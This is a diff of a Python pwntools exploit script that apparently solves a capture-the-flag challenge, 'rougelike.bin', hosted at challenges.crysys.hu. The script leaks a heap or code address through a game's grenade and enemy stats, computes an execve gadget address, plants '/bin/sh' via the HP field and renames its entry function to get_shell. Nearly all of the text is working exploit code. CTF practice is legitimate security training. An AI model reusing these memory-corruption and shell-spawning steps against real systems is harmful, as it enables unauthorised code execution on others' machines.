@@ -1,17 +1,12 @@
 
-import os
 import pwn
 import sys
-import random
 import re
-
 
 pwn.context.log_level = 'error'
 
 execve_gadget_addr = 0x00005555555633a3
 alloc_dealloc_addr = 0x000055555556c5fe
-
-rdi_content = 0x7fffffffd5d0
 bin_sh = 0x68732F6E69622F
 
 def select_gender(conn, gender):
@@ -62,7 +57,7 @@ def upper(addr):
 def lower(addr):
     return addr & 0xffffffff
 
-def exploit(conn):
+def get_shell(conn):
     select_gender(conn, '1')
 
     hp = lower(bin_sh) * 2  # the lower 32 bits of the address has to be multiplied by 2, because djinn divides hp by 2.
@@ -70,12 +65,8 @@ def exploit(conn):
     load_state(
         conn=conn,
         hp=hp,
-        weapon=0,
-        armor=0,
-        healing_potions=0,
-        poisons=0,
         gold=0x66666666,
-        gender=0x10888888
+        gender=2
     )
    
     buy_granade(conn)
@@ -89,14 +80,13 @@ def exploit(conn):
 
     use_granade(conn)
 
-    current_dealloc_addr = (enemy_weapon << 32) + enemy_hp
-    current_execve_gadget_addr = current_dealloc_addr - alloc_dealloc_addr + execve_gadget_addr
+    current_alloc_dealloc_addr = (enemy_weapon << 32) + enemy_hp
+    current_execve_gadget_addr = current_alloc_dealloc_addr - alloc_dealloc_addr + execve_gadget_addr
 
-    print(hex(current_execve_gadget_addr))
     fight(conn)
     yes_djinn(conn)
 
-    for i in range(15):
+    for _ in range(15):
         line = conn.recvuntil('? ').decode('utf-8')
 
         if any([word in line for word in ['AAAAAAAA', 'Unix timestamp', 'Richard Stallman', 'even prime', '3↑↑3']]):
@@ -118,4 +108,4 @@ def exploit(conn):
 # conn = pwn.process('./rougelike.bin')
 conn = pwn.remote('challenges.crysys.hu', 5008)
 
-exploit(conn)
+get_shell(conn)
